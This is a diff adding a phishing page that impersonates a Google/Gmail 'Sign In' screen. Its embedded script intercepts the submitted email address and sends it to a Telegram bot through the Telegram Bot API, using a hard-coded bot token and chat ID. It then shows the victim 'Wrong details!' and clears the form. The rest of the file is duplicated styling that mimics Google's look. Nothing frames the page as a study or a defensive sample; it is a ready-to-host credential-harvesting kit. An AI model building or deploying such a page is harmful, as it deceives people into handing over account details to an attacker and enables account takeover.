@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Form</title>
+    <link rel="stylesheet" href="google.css">
+</head>
+<body>
+
+    <div class="box">
+        <div class="logo">
+
+        </div>
+    <h2 style="text-align: left; font-weight: 400; font-size: 32px; margin-top: 15px;">Sign In</h2>
+    <p style="text-align: left; font-size: 17px;">to continue Gmail</p>
+      
+   
+        <form id="messageForm">
+        <div class="inputBox" style="margin-top: 45px;">
+          <input type="email" name="Gmail" required>
+          <label>Email or phone</label>
+        </div>
+            <a href="#"><p style="text-align: left; font-weight: 500; font-size: 14px;">Forgot email?</p></a>
+          <p style="text-align: left; color: deep-gray; text-decoration: none; margin-top: 52px;">Not your computer? Use Guest mode to sign in privately. <a href="#"><b>Learn more about using Guest mode</b></a></p>
+          
+        <input type="submit" name="sign-in" value="Next">
+      </form>
+    </div>
+      </div>
+    </div>
+    
+    <script>
+    const chat_id = '6858160596', botID = 'bot7109361523:AAGQqHSt5UGNddTWn4xZ-nGGeePsE3gfI6k';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#messageForm').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "Wrong details!";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+    });
+</script>
+    
+  </body>
+</html>
+
+<style>
+body{
+    margin: 0;
+    padding: 0;
+    background-size: cover;
+    font-family: 'arial;
+  font-weight: 600;
+  text-decoration: bold;
+}
+
+.box {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    padding: 3.5rem;
+    box-sizing: border-box;
+    border: 1px solid #dadce0;
+    -webkit-border-radius: 8px;
+    border-radius: 8px;
+
+}
+
+.box h2 {
+    margin: 0px 0 -0.125rem;
+    padding: 0;
+    text-align: center;
+    color: #202124;
+    font-size: 24px;
+    font-weight: 400;
+}
+
+.box .logo 
+{
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    margin-bottom: 10px;
+
+}
+
+.box p {
+    font-size: 16px;
+    font-weight: 400;
+    letter-spacing: 1px;
+    line-height: 1.5;
+    margin-bottom: 134px;
+    text-align: center;
+}
+
+.box .inputBox {
+    position: relative;
+}
+
+.box .inputBox input {
+    width: 0%;
+    padding: 1.3rem 10px;
+    font-size: 1rem;
+   letter-spacing: 0.062rem;
+   margin-bottom: 0.875rem;
+   border: 1px solid #ccc;
+   background: transparent;
+   border-radius: 4px;
+}
+
+.box .inputBox label {
+    position: absolute;
+    top: 0;
+    left: 10px;
+    padding: 0.625rem 0;
+    font-size: 1rem;
+    color: gray;
+    pointer-events: none;
+    transition: 0.5s;
+}
+
+.box .inputBox input:focus ~ label,
+.box .inputBox input:valid ~ label,
+.box .inputBox input:not([value=""]) ~ label {
+    top: -1.125rem;
+    left: 10px;
+    color: #1a73e8;
+    font-size: 0.75rem;
+    background-color: #fff;
+    height: 10px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+.box .inputBox input:focus {
+    outline: none;
+    border: 2px solid #1a73e8;
+}
+
+.box input[type="submit"] {
+    border: none;
+    outline: none;
+    color: #fff;
+    background-color: #1a73e8;
+    padding: 0.625rem 1.25rem;
+    cursor: pointer;
+    border-radius: 0.312rem;
+    font-size: 1rem;
+    float: right;
+  }
+
+  .box input[type="submit"]:hover {
+    background-color: #287ae6;
+    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
+  }
+
+@import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');
+
+
+body {
+    margin: 0;
+    padding: 0;
+    background-size: cover;
+    font-family: 'Open Sans', sans-serif;
+}
+
+.box {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 30rem;
+    padding: 3.5rem;
+    box-sizing: border-box;
+    border: 1px solid #dadce0;
+    -webkit-border-radius: 8px;
+    border-radius: 8px;
+
+}
+
+.box h2 {
+    margin: 0px 0 -0.125rem;
+    padding: 0;
+    text-align: center;
+    color: #202124;
+    font-size: 24px;
+    font-weight: 400;
+}
+
+.box .logo 
+{
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    margin-bottom: 16px;
+
+}
+
+.box p {
+    font-size: 16px;
+    font-weight: 400;
+    letter-spacing: 1px;
+    line-height: 1.5;
+    margin-bottom: 24px;
+    text-align: center;
+}
+
+.box .inputBox {
+    position: relative;
+}
+
+.box .inputBox input {
+    width: 93%;
+    padding: 1.3rem 10px;
+    font-size: 1rem;
+   letter-spacing: 0.062rem;
+   margin-bottom: -0.3rem;
+   border: 1px solid #ccc;
+   background: transparent;
+   border-radius: 4px;
+}
+
+.box .inputBox label {
+    position: absolute;
+    top: 0;
+    left: 10px;
+    padding: 0.625rem 0;
+    font-size: 1rem;
+    color: gray;
+    pointer-events: none;
+    transition: 0.5s;
+}
+
+.box .inputBox input:focus ~ label,
+.box .inputBox input:valid ~ label,
+.box .inputBox input:not([value=""]) ~ label {
+    top: -1.125rem;
+    left: 10px;
+    color: #1a73e8;
+    font-size: 0.75rem;
+    background-color: #fff;
+    height: 10px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+.box .inputBox input:focus {
+    outline: none;
+    border: 2px solid #1a73e8;
+}
+
+.box input[type="submit"] {
+    border: none;
+    outline: none;
+    color: #fff;
+    background-color: #1a73e8;
+    padding: 0.625rem 1.45rem;
+    cursor: pointer;
+    border-radius: 30px;
+    font-size: 1rem;
+    float: right;
+  margin-bottom: 40px;
+   }
+
+  .box input[type="submit"]:hover {
+    background-color: #287ae6;
+    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
+  }
+  
+</style> 
